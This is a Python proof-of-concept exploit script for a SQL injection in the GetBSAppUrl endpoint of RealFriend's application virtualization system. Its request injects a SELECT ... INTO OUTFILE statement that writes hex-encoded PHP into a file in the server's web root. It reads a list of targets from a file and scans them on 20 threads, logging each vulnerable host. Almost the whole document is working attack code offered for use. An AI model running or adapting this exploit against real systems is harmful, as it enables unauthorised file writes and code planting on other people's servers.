# -*- coding: utf-8 -*-
import argparse
import re

import requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    test = """
    ____      _   ____ ____    _                _   _      _   ____   ___  _      
   / ___| ___| |_| __ ) ___|  / \   _ __  _ __ | | | |_ __| | / ___| / _ \| |     
  | |  _ / _ \ __|  _ \___ \ / _ \ | '_ \| '_ \| | | | '__| | \___ \| | | | |     
  | |_| |  __/ |_| |_) |__) / ___ \| |_) | |_) | |_| | |  | |  ___) | |_| | |___  
   \____|\___|\__|____/____/_/   \_\ .__/| .__/ \___/|_|  |_| |____/ \__\_\_____| 
                                   |_|   |_|                                      

                                            tag:  瑞友 应用虚拟化系统 GetBSAppUrl SQL注入漏洞                                      
                                                     @version: 1.0.0   @author: zl                                                                    


 """
    print(test)


def poc(target):
    if not re.match(r'^https?://', target):
        target = "http://" + target

    url = target + "/index.php?s=/Agent/GetBSAppUrl/AppID/')%3bselect+0x3c3f70687020706870696e666f28293b3f3e+into+outfile+%27C%3a\\Program+Files+(x86)\\RealFriend\\Rap+Server\\WebRoot\\test7.php%27%23/123"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"
    }

    try:
        res = requests.get(url, headers=headers,verify=False, timeout=10)
        if res.status_code == 200 and "result" in res.text:
            result = "[+]{} is vulnerable".format(target)
            print(result)
            with open("output.txt", "a") as f:
                f.write(result + "\n")
        else:
            result = "[-]{} is not vulnerable".format(target)
            print(result)
            print()
    except requests.exceptions.RequestException as e:
        print("error", str(e))
        return False

def main():
    parser = argparse.ArgumentParser(description='瑞友 应用虚拟化系统 GetBSAppUrl SQL注入漏洞')
    parser.add_argument("-u", "--url", dest="url", type=str, help="example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as file:
            for url in file:
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(20)  # 20自己指定的线程数
        mp.map(poc, url_list)  # printNumber 函数 target 目标列表
        mp.close()
        mp.join()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
    banner()
